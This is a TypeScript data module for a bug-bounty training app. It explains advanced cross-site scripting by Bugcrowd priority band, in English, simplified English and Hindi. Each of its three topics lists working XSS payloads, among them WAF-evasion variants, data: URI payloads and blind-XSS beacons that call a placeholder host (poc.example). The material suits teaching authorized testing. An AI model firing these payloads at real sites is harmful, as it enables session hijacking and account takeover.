import type { LearnGroup } from "@/learn/data/types";

// Advanced XSS content organized the way Bugcrowd actually bands it: by the
// ACTOR model and delivery vector, not by the textbook reflected/stored/DOM
// split. Leads with the P3 reflected-non-self and P3/P4 stored-by-actor
// variants, plus the P4 universal/referer/off-domain family, with the P2 and
// P1 escalations called out as targets.
//
// VRT paths, priorities and default CVSS vectors are from Bugcrowd release
// 2026-07-08. CWE id is CWE-79 across the family.

export const xssGroup: LearnGroup = {
  id: "xss",
  name: "Cross-Site Scripting (XSS)",
  emoji: "🧨",
  blurb:
    "Attacker JavaScript executing in a victim's session in the app's origin. Bugcrowd bands it by WHO can deliver it and to WHOM — not by reflected/stored/DOM — so the payout is a function of the actor model, not the payload. These are the P3/P4 leads with the P2/P1 escalations flagged.",
  topics: [
    {
      id: "reflected-non-self",
      name: "Reflected XSS (Non-Self)",
      emoji: "🔁",
      intro: {
        en: "A parameter is reflected unescaped into the response and executes when a victim opens a crafted link. The P3/P5 split is entirely deliverability: 'Non-Self' means you can trigger it on another user with a link alone (a GET-reflected sink) — that is the P3; 'Self' means the victim must paste the payload into their own authenticated session, which is P5 and not rewardable alone. The default vector's S:C (scope changed) captures script in the app origin acting against the user. The 2025 reality is that raw reflection is rare; the work is context-aware breakout and WAF evasion.",
        simple: "A parameter is copied into the page without escaping, so it runs as code when a victim opens your crafted link. The band is all about delivery: if one link fires it on someone else (a GET sink) that is 'Non-Self' = P3; if the victim has to paste the payload into their own logged-in session that is 'Self' = P5 and pays nothing on its own. The S:C in the vector means the script runs in the app's origin against the user. These days plain reflection is rare — the real work is breaking out of the exact context and getting past the WAF.",
        hi: "एक parameter बिना escape किए response में reflect हो जाता है और जब victim एक crafted link खोलता है तो वह code की तरह चल जाता है। P3/P5 का फ़र्क़ पूरी तरह deliverability का है: 'Non-Self' यानी आप सिर्फ़ एक link से इसे किसी दूसरे user पर trigger कर सकते हैं (GET-reflected sink) — यह P3 है; 'Self' यानी victim को payload खुद अपने authenticated session में paste करना पड़ता है, जो P5 है और अकेले reward नहीं देता। default vector का S:C (scope changed) बताता है कि script app के origin में चलकर user के ख़िलाफ़ काम करती है। 2025 की हक़ीक़त यह है कि सीधा reflection कम मिलता है; असली काम context के हिसाब से breakout और WAF evasion है।",
      },
      howToFind: [
        {
          title: {
            en: "Canary, then break the exact context",
            simple: "Send a canary, then break the exact context",
            hi: "पहले canary भेजें, फिर exact context तोड़ें",
          },
          steps: [
            {
              en: "Fire a unique non-executing canary (bbh9311zz) into every parameter and locate each reflection and its context: HTML body, attribute value, inside <script>, a URL/href, or a JS template literal.",
              simple: "Put a unique harmless marker (bbh9311zz) into every parameter and find where it comes back and in what context: HTML body, an attribute value, inside <script>, a URL/href, or a JS template literal.",
              hi: "हर parameter में एक unique non-executing canary (bbh9311zz) डालें और देखें वह कहाँ-कहाँ reflect होता है और किस context में: HTML body, attribute value, <script> के अंदर, URL/href, या JS template literal।",
            },
            {
              en: "Craft the breakout for that context specifically — \"><svg onload=…> for an attribute, '-alert()-' inside a JS string, javascript: for an href sink — a generic payload usually dies in the wrong context.",
              simple: "Build the breakout for that one context — \"><svg onload=…> for an attribute, '-alert()-' inside a JS string, javascript: for an href sink. A one-size-fits-all payload usually fails in the wrong context.",
              hi: "उसी context के लिए खास breakout बनाएँ — attribute के लिए \"><svg onload=…>, JS string के अंदर '-alert()-', href sink के लिए javascript:। एक generic payload ग़लत context में अक्सर काम नहीं करता।",
            },
            {
              en: "Keep it Non-Self: prove it fires from a GET link you can hand to a victim. If it only works when the victim submits a form in their own session, it is Self (P5) and you need a delivery vector (CSRF to the reflecting endpoint, or a redirect) to lift it.",
              simple: "Keep it Non-Self: show it fires from a GET link you can send to a victim. If it only works when the victim submits a form in their own session, it is Self (P5) and you need a delivery trick (CSRF to that endpoint, or a redirect) to raise it.",
              hi: "इसे Non-Self रखें: साबित करें कि यह एक GET link से fire होता है जिसे आप victim को दे सकें। अगर यह सिर्फ़ तभी चले जब victim खुद अपने session में form submit करे, तो यह Self (P5) है और इसे ऊपर उठाने के लिए delivery vector चाहिए (reflecting endpoint पर CSRF, या redirect)।",
            },
          ],
        },
        {
          title: {
            en: "Modern filter / WAF evasion",
            simple: "Getting past modern filters / WAFs",
            hi: "आधुनिक filter / WAF evasion",
          },
          steps: [
            {
              en: "When angle brackets or 'script' are filtered, pivot to event handlers and SVG/MathML (<svg/onload=…>, <math href>), HTML-entity and overlong-UTF8 encodings, and case/whitespace mutations the WAF normalizes differently from the browser.",
              simple: "If angle brackets or the word 'script' are blocked, switch to event handlers and SVG/MathML (<svg/onload=…>, <math href>), HTML-entity and overlong-UTF8 encodings, and case/whitespace tricks that the WAF reads differently from the browser.",
              hi: "जब angle brackets या 'script' filter हो, तो event handlers और SVG/MathML (<svg/onload=…>, <math href>), HTML-entity और overlong-UTF8 encodings, और case/whitespace बदलाव आज़माएँ जिन्हें WAF और browser अलग-अलग normalize करते हैं।",
            },
            {
              en: "For framework sinks, test the templating layer directly — Angular/Vue expression contexts, React dangerouslySetInnerHTML, and attribute interpolations that re-enable injection the framework normally escapes.",
              simple: "For framework sinks, test the templating layer itself — Angular/Vue expression contexts, React dangerouslySetInnerHTML, and attribute interpolations that re-open injection the framework usually escapes.",
              hi: "framework sinks के लिए templating layer को सीधे test करें — Angular/Vue expression contexts, React dangerouslySetInnerHTML, और वे attribute interpolations जो injection को फिर खोल देते हैं जिसे framework आम तौर पर escape करता है।",
            },
            {
              en: "Confirm in a real browser (headless or live) that document.domain shows the TARGET origin, not a sandbox or data: context — a confirmed cross-origin alert is the proof triage wants.",
              simple: "Confirm in a real browser (headless or live) that document.domain shows the TARGET origin, not a sandbox or a data: context — an alert proven in the target's own origin is what triage wants.",
              hi: "असली browser (headless या live) में confirm करें कि document.domain TARGET origin दिखाए, न कि कोई sandbox या data: context — target के origin में confirmed alert ही वह proof है जो triage चाहता है।",
            },
          ],
        },
      ],
      payloads: [
        "\"><svg onload=alert(document.domain)>      (attribute/HTML breakout)",
        "'-alert(document.domain)-'                  (inside a JS string)",
        "javascript:alert(document.domain)           (href / redirect sink)",
        "<svg/onload=confirm(document.domain)>       (bracket-light WAF evasion)",
      ],
      example: {
        en: "A search endpoint reflected ?q= into an onclick attribute. Breaking out with \"/><svg onload=alert(document.domain)> fired for anyone opening the crafted search link, so it was Non-Self: VRT 'Reflected › Non-Self' P3. The same bug reached only through a POST the victim submits themselves would have been 'Self' P5 until paired with a CSRF delivery.",
        simple: "A search endpoint put ?q= straight into an onclick attribute. Breaking out with \"/><svg onload=alert(document.domain)> fired for anyone who opened the crafted search link, so it was Non-Self: VRT 'Reflected › Non-Self' P3. If the same bug were only reachable through a POST the victim submits themselves, it would be 'Self' P5 until paired with a CSRF delivery.",
        hi: "एक search endpoint ने ?q= को सीधे onclick attribute में reflect कर दिया। \"/><svg onload=alert(document.domain)> से breakout करने पर यह उस हर व्यक्ति पर fire हुआ जो crafted search link खोले, इसलिए यह Non-Self था: VRT 'Reflected › Non-Self' P3। अगर यही bug सिर्फ़ उस POST से पहुँचता जिसे victim खुद submit करे, तो यह 'Self' P5 होता — जब तक इसे CSRF delivery के साथ न जोड़ा जाए।",
      },
      mapping: {
        bugcrowdVrt: "Cross-Site Scripting (XSS) › Reflected › Non-Self",
        bugcrowdPriority: "P3",
        bugcrowdCvss: "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        hackeroneCwe: "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
        cvssSeverity: "Medium",
        note: {
          en: "Non-Self (deliverable to a victim via a crafted link) is P3; Self XSS (victim must paste into their own session) is P5 and not rewardable alone. The S:C in the vector reflects execution in the app origin affecting the user.",
          simple: "Non-Self (you can send a victim a link that fires it) is P3; Self XSS (the victim must paste it into their own session) is P5 and pays nothing alone. The S:C in the vector means it runs in the app's origin and affects the user.",
          hi: "Non-Self (crafted link से victim तक पहुँचाया जा सके) P3 है; Self XSS (victim को खुद अपने session में paste करना पड़े) P5 है और अकेले reward नहीं देता। vector का S:C दिखाता है कि यह app के origin में चलकर user को प्रभावित करता है।",
        },
      },
      checklistCategoryId: "inject-xss",
      references: [
        { label: "PortSwigger: Reflected XSS", url: "https://portswigger.net/web-security/cross-site-scripting/reflected" },
      ],
    },
    {
      id: "stored-by-actor",
      name: "Stored XSS — by Actor",
      emoji: "📌",
      intro: {
        en: "Stored XSS banding is driven by the actor pair — who can plant the payload and who it fires for — not by the payload itself. Non-Privileged User → Anyone is the P2 earner: any user stores it and any viewer, admins included, executes it. Privileged User → Privilege Elevation is P3 (a privileged actor stores script that executes in a context that grants them more than they had). Privileged → No Privilege Elevation is P4, and Self is P5. The highest-value finds are the blind ones that fire inside internal admin tooling you never see.",
        simple: "Stored XSS banding depends on the actor pair — who can plant the payload and who it fires for — not on the payload itself. Non-Privileged User → Anyone is the P2 earner: any user stores it and any viewer, admins included, runs it. Privileged User → Privilege Elevation is P3 (a privileged user stores script that runs in a context giving them more than they had). Privileged → No Privilege Elevation is P4, and Self is P5. The best finds are the blind ones that fire inside internal admin tools you never get to see.",
        hi: "Stored XSS की banding actor pair से तय होती है — कौन payload plant कर सकता है और वह किसके लिए fire होता है — न कि payload से। Non-Privileged User → Anyone सबसे ज़्यादा कमाने वाला P2 है: कोई भी user इसे store करे और कोई भी viewer, admins समेत, इसे execute करे। Privileged User → Privilege Elevation P3 है (privileged actor ऐसी script store करता है जो उसे पहले से ज़्यादा अधिकार देने वाले context में चलती है)। Privileged → No Privilege Elevation P4 है, और Self P5। सबसे क़ीमती finds वे blind होते हैं जो internal admin tooling के अंदर fire होते हैं जिसे आप कभी देख ही नहीं पाते।",
      },
      howToFind: [
        {
          title: {
            en: "Map the plant/fire actor pair before you report",
            simple: "Work out the plant/fire actor pair before reporting",
            hi: "report से पहले plant/fire actor pair तय करें",
          },
          steps: [
            {
              en: "For each persistence surface, answer two questions: what privilege does storing require, and whose browser renders it — those two answers pick the VRT leaf and therefore the band.",
              simple: "For each place that stores input, answer two things: what privilege is needed to store it, and whose browser renders it — those two answers pick the VRT leaf, and so the band.",
              hi: "हर persistence surface के लिए दो सवालों के जवाब दें: store करने के लिए कितना privilege चाहिए, और इसे किसका browser render करता है — ये दो जवाब VRT leaf और इसलिए band तय करते हैं।",
            },
            {
              en: "Chase Non-Privileged → Anyone: fields any user controls that render to other users or staff — display names, comments, filenames, support-ticket bodies, SVG/markdown/log-viewer renderers.",
              simple: "Go after Non-Privileged → Anyone: fields any user controls that get shown to other users or staff — display names, comments, filenames, support-ticket bodies, and SVG/markdown/log-viewer renderers.",
              hi: "Non-Privileged → Anyone के पीछे जाएँ: वे fields जिन्हें कोई भी user control करता है और जो दूसरे users या staff को render होते हैं — display names, comments, filenames, support-ticket bodies, SVG/markdown/log-viewer renderers।",
            },
            {
              en: "Store as user A, then view as a different, higher-privilege user B to confirm cross-actor execution — a payload that only fires for the account that stored it is Self (P5).",
              simple: "Store it as user A, then view it as a different, higher-privilege user B to confirm it runs across actors — a payload that only fires for the account that stored it is Self (P5).",
              hi: "user A के रूप में store करें, फिर एक अलग, ऊँचे-privilege वाले user B के रूप में देखें ताकि cross-actor execution confirm हो — जो payload सिर्फ़ उसी account के लिए fire हो जिसने इसे store किया, वह Self (P5) है।",
            },
          ],
        },
        {
          title: {
            en: "Blind XSS into admin surfaces",
            simple: "Blind XSS into admin screens",
            hi: "admin surfaces में blind XSS",
          },
          steps: [
            {
              en: "Seed benign callback beacons (XSS Hunter / interactsh) into fields that are read later by staff — abuse reports, user-agent logging, invoice notes, moderation queues.",
              simple: "Plant harmless callback beacons (XSS Hunter / interactsh) into fields staff read later — abuse reports, user-agent logs, invoice notes, moderation queues.",
              hi: "benign callback beacons (XSS Hunter / interactsh) उन fields में seed करें जिन्हें बाद में staff पढ़ता है — abuse reports, user-agent logging, invoice notes, moderation queues।",
            },
            {
              en: "A callback from an internal admin origin is the proof of a Privileged-context stored XSS; capture the firing URL/DOM, never real session data, to keep it benign.",
              simple: "A callback coming from an internal admin origin proves a stored XSS in a privileged context; capture the firing URL/DOM only, never real session data, to keep it safe.",
              hi: "किसी internal admin origin से आया callback ही Privileged-context stored XSS का proof है; इसे benign रखने के लिए सिर्फ़ firing URL/DOM capture करें, कभी असली session data नहीं।",
            },
            {
              en: "Note the escalation ladder explicitly in the report: Privileged→No-Elevation P4, Privileged→Elevation P3, Non-Privileged→Anyone P2, and a stored payload that forces a state change in an admin's session trends toward P1.",
              simple: "Spell out the escalation ladder in the report: Privileged→No-Elevation P4, Privileged→Elevation P3, Non-Privileged→Anyone P2, and a stored payload that forces a state change in an admin's session heads toward P1.",
              hi: "report में escalation ladder साफ़ लिखें: Privileged→No-Elevation P4, Privileged→Elevation P3, Non-Privileged→Anyone P2, और ऐसा stored payload जो admin के session में state change करा दे वह P1 की ओर जाता है।",
            },
          ],
        },
      ],
      payloads: [
        "\"><svg onload=alert(document.domain)>                 (stored, cross-actor confirm)",
        "<img src=x onerror=fetch('//poc.example/stored-fired')>  (benign blind-XSS beacon)",
        "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=alert(document.domain)/>   (stored via SVG upload)",
        "\"><script src=//poc.example/c></script>               (blind callback marker)",
      ],
      example: {
        en: "A profile display-name field stored HTML unescaped and rendered it in the admin user-management grid. A low-privilege user's <svg onload> beacon fired in an administrator's browser (blind XSS). Because a non-privileged actor reached an admin viewer, it mapped to VRT 'Stored › Non-Privileged User to Anyone' P2; wiring the payload to perform an admin-only state change in that session was the path to P1.",
        simple: "A profile display-name field stored HTML without escaping and showed it in the admin user-management grid. A low-privilege user's <svg onload> beacon fired in an admin's browser (blind XSS). Because a non-privileged actor reached an admin viewer, it mapped to VRT 'Stored › Non-Privileged User to Anyone' P2; making the payload perform an admin-only state change in that session was the route to P1.",
        hi: "एक profile display-name field ने HTML बिना escape किए store किया और उसे admin user-management grid में render कर दिया। एक low-privilege user का <svg onload> beacon एक administrator के browser में fire हुआ (blind XSS)। चूँकि एक non-privileged actor admin viewer तक पहुँचा, यह VRT 'Stored › Non-Privileged User to Anyone' P2 पर map हुआ; payload को उस session में admin-only state change कराने तक wire करना P1 का रास्ता था।",
      },
      mapping: {
        bugcrowdVrt: "Cross-Site Scripting (XSS) › Stored › Privileged User to Privilege Elevation",
        bugcrowdPriority: "P3",
        bugcrowdCvss: "AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N",
        hackeroneCwe: "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
        cvssSeverity: "Medium",
        note: {
          en: "Actor model sets the band: Non-Privileged User → Anyone P2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N); Privileged User → Privilege Elevation P3; Privileged User → No Privilege Elevation P4 (…/PR:H/…/C:L/I:L/A:N); Self P5. Who can plant and who it fires for decide severity, not the payload.",
          simple: "The actor model sets the band: Non-Privileged User → Anyone P2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N); Privileged User → Privilege Elevation P3; Privileged User → No Privilege Elevation P4 (…/PR:H/…/C:L/I:L/A:N); Self P5. Who can plant it and who it fires for set the severity, not the payload.",
          hi: "band actor model से तय होती है: Non-Privileged User → Anyone P2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N); Privileged User → Privilege Elevation P3; Privileged User → No Privilege Elevation P4 (…/PR:H/…/C:L/I:L/A:N); Self P5। severity यह तय करता है कि कौन plant कर सकता है और यह किसके लिए fire होता है, न कि payload।",
        },
      },
      checklistCategoryId: "inject-xss",
    },
    {
      id: "uxss-referer-datauri",
      name: "UXSS / Referer / Off-Domain Data-URI",
      emoji: "🧪",
      intro: {
        en: "The P4 corner of the family, each findable for a different structural reason. Universal XSS (UXSS) abuses a bug in the browser, extension, or embedded webview to break the same-origin policy so script runs across origins — the default vector carries AC:H because it depends on a vulnerable client. Referer-based XSS reflects a payload smuggled in the Referer header. Off-Domain › Data URI executes from a data: URI, i.e. a unique/opaque origin that is off the target domain, which is exactly why it is P4 and not the P3 same-origin reflected case. Cookie-Based XSS is P5.",
        simple: "The P4 corner of the family, each found for a different structural reason. Universal XSS (UXSS) abuses a bug in the browser, an extension, or an embedded webview to break the same-origin policy so script runs across origins — the vector carries AC:H because it needs a vulnerable client. Referer-based XSS reflects a payload hidden in the Referer header. Off-Domain › Data URI runs from a data: URI, i.e. a unique/opaque origin off the target domain, which is why it is P4 and not the P3 same-origin case. Cookie-Based XSS is P5.",
        hi: "इस family का P4 कोना, हर एक अलग structural वजह से findable। Universal XSS (UXSS) browser, extension, या embedded webview के किसी bug का फ़ायदा उठाकर same-origin policy तोड़ता है ताकि script origins के पार चले — default vector में AC:H है क्योंकि यह एक vulnerable client पर निर्भर करता है। Referer-based XSS Referer header में छिपाए गए payload को reflect करता है। Off-Domain › Data URI एक data: URI से execute होता है, यानी एक unique/opaque origin जो target domain से बाहर है, और यही वजह है कि यह P4 है, P3 वाला same-origin reflected case नहीं। Cookie-Based XSS P5 है।",
      },
      howToFind: [
        {
          title: {
            en: "Separate the three by execution origin",
            simple: "Tell the three apart by where they run",
            hi: "तीनों को execution origin से अलग करें",
          },
          steps: [
            {
              en: "For UXSS, test embedded WebViews / in-app browsers and extension message handlers for SOP breaks — a payload in one frame reading or scripting another origin's document is UXSS, not ordinary XSS.",
              simple: "For UXSS, test embedded WebViews / in-app browsers and extension message handlers for same-origin-policy breaks — a payload in one frame reading or scripting another origin's document is UXSS, not ordinary XSS.",
              hi: "UXSS के लिए embedded WebViews / in-app browsers और extension message handlers को SOP breaks के लिए test करें — एक frame का payload जो किसी दूसरे origin के document को पढ़े या script करे वह UXSS है, साधारण XSS नहीं।",
            },
            {
              en: "For Referer-based, set a scripted Referer (via an off-site link or a controlled redirect) and watch for it being reflected unescaped into a page — common on error/analytics/landing pages.",
              simple: "For Referer-based, set a scripted Referer (via an off-site link or a redirect you control) and watch for it being reflected unescaped into a page — common on error, analytics, and landing pages.",
              hi: "Referer-based के लिए एक scripted Referer सेट करें (किसी off-site link या अपने control वाले redirect से) और देखें कि यह किसी page में बिना escape किए reflect तो नहीं हो रहा — error/analytics/landing pages पर आम है।",
            },
            {
              en: "For Off-Domain Data URI, get the app to navigate to or embed a data:text/html payload (open-redirect-to-data:, sandboxed iframe src) and note that execution happens in an opaque origin — document.domain will NOT be the target, which is what caps it at P4.",
              simple: "For Off-Domain Data URI, make the app navigate to or embed a data:text/html payload (open-redirect-to-data:, sandboxed iframe src) and note that it runs in an opaque origin — document.domain will NOT be the target, which is what caps it at P4.",
              hi: "Off-Domain Data URI के लिए app से किसी data:text/html payload पर navigate करवाएँ या उसे embed कराएँ (open-redirect-to-data:, sandboxed iframe src) और ध्यान दें कि execution एक opaque origin में होता है — document.domain target नहीं होगा, और यही इसे P4 पर रोक देता है।",
            },
          ],
        },
        {
          title: {
            en: "Score honestly and look for the lift",
            simple: "Score it honestly and look for the lift",
            hi: "ईमानदारी से score करें और lift ढूँढें",
          },
          steps: [
            {
              en: "Confirm the origin of execution in DevTools before claiming a band: target-origin reflected is P3, opaque/data: origin is P4, cookie-only trigger is P5.",
              simple: "Confirm in DevTools where it actually runs before you claim a band: target origin is P3, opaque/data: origin is P4, cookie-only trigger is P5.",
              hi: "band का दावा करने से पहले DevTools में confirm करें कि execution कहाँ हुआ: target-origin reflected P3, opaque/data: origin P4, सिर्फ़-cookie trigger P5।",
            },
            {
              en: "The escalation is moving execution back into the target's own origin — if a Referer or data: vector can be chained into same-origin script (e.g. the reflected value later renders on a target page), it climbs from P4 toward the P3 reflected band.",
              simple: "The lift is moving execution back into the target's own origin — if a Referer or data: vector can be chained into same-origin script (e.g. the reflected value later shows on a target page), it climbs from P4 toward the P3 reflected band.",
              hi: "escalation का मतलब है execution को वापस target के अपने origin में ले जाना — अगर Referer या data: vector को same-origin script में chain किया जा सके (जैसे reflected value बाद में किसी target page पर render हो), तो यह P4 से P3 reflected band की ओर चढ़ता है।",
            },
            {
              en: "Keep proofs benign: alert(document.domain) to show the executing origin, or an OOB beacon — never pivot into live session data.",
              simple: "Keep proofs harmless: alert(document.domain) to show the origin it runs in, or an OOB beacon — never pivot into live session data.",
              hi: "proofs benign रखें: execution origin दिखाने के लिए alert(document.domain), या एक OOB beacon — कभी live session data में pivot न करें।",
            },
          ],
        },
      ],
      payloads: [
        "data:text/html,<script>alert(document.domain)</script>   (Off-Domain › Data URI, opaque origin)",
        "Referer: https://poc.example/\"><svg onload=alert(document.domain)>   (Referer-based)",
        "?redirect=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+   (redirect-to-data:)",
        "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>   (data: in a frame)",
      ],
      example: {
        en: "An in-app WebView loaded partner content and a message handler reflected a URL fragment into the host page's DOM, letting partner-origin script read the host origin's document — a classic UXSS via the embedded browser. No same-origin injection existed on the web app itself, so it mapped to VRT 'Universal (UXSS)' P4 (AC:H for the vulnerable-client dependency); demonstrating it reading an auth token from the host origin was the argument for triaging at the top of that band.",
        simple: "An in-app WebView loaded partner content and a message handler reflected a URL fragment into the host page's DOM, letting partner-origin script read the host origin's document — a classic UXSS through the embedded browser. The web app itself had no same-origin injection, so it mapped to VRT 'Universal (UXSS)' P4 (AC:H because it needs a vulnerable client); showing it read an auth token from the host origin was the case for triaging at the top of that band.",
        hi: "एक in-app WebView ने partner content load किया और एक message handler ने URL fragment को host page के DOM में reflect कर दिया, जिससे partner-origin script host origin का document पढ़ सकी — embedded browser के ज़रिए एक classic UXSS। web app पर ख़ुद कोई same-origin injection नहीं थी, इसलिए यह VRT 'Universal (UXSS)' P4 पर map हुआ (vulnerable-client निर्भरता के कारण AC:H); इसे host origin से auth token पढ़ते दिखाना ही उस band के top पर triage का तर्क था।",
      },
      mapping: {
        bugcrowdVrt: "Cross-Site Scripting (XSS) › Universal (UXSS)",
        bugcrowdPriority: "P4",
        bugcrowdCvss: "AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N",
        hackeroneCwe: "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
        cvssSeverity: "Low",
        note: {
          en: "UXSS, Referer-based, and Off-Domain › Data URI are each P4; Cookie-Based XSS is P5. The AC:H on UXSS reflects the dependency on a vulnerable browser/webview to break the same-origin policy. Moving execution back into the target's own origin lifts it toward the P3 reflected band.",
          simple: "UXSS, Referer-based, and Off-Domain › Data URI are each P4; Cookie-Based XSS is P5. The AC:H on UXSS reflects that it needs a vulnerable browser/webview to break the same-origin policy. Moving execution back into the target's own origin lifts it toward the P3 reflected band.",
          hi: "UXSS, Referer-based, और Off-Domain › Data URI हर एक P4 हैं; Cookie-Based XSS P5 है। UXSS पर AC:H इस निर्भरता को दर्शाता है कि same-origin policy तोड़ने के लिए एक vulnerable browser/webview चाहिए। execution को वापस target के अपने origin में ले जाना इसे P3 reflected band की ओर उठाता है।",
        },
      },
      checklistCategoryId: "inject-xss",
      references: [
        { label: "PortSwigger: Cross-site scripting", url: "https://portswigger.net/web-security/cross-site-scripting" },
      ],
    },
  ],
};
